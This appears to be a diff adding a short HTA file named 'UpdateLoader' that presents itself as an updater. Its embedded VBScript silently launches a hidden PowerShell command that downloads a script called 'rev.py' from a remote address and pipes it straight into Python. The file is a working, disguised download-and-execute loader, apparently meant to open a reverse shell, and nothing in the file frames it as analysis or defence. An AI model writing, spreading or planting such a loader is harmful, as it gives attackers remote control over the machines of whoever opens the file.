@@ -1,0 +1,13 @@
+<HTML>
+<HEAD>
+  <hta:application id="htaApp" applicationname="UpdateLoader"/>
+</HEAD>
+<BODY>
+<script language="VBScript">
+  Set sh = CreateObject("WScript.Shell")
+  cmd = "powershell -NoProfile -WindowStyle Hidden -Command " & _
+        "\"(New-Object System.Net.WebClient).DownloadString('http://10.0.0.1/rev.py') | python -\""
+  sh.Run cmd, 0, False
+</script>
+</BODY>
+</HTML>
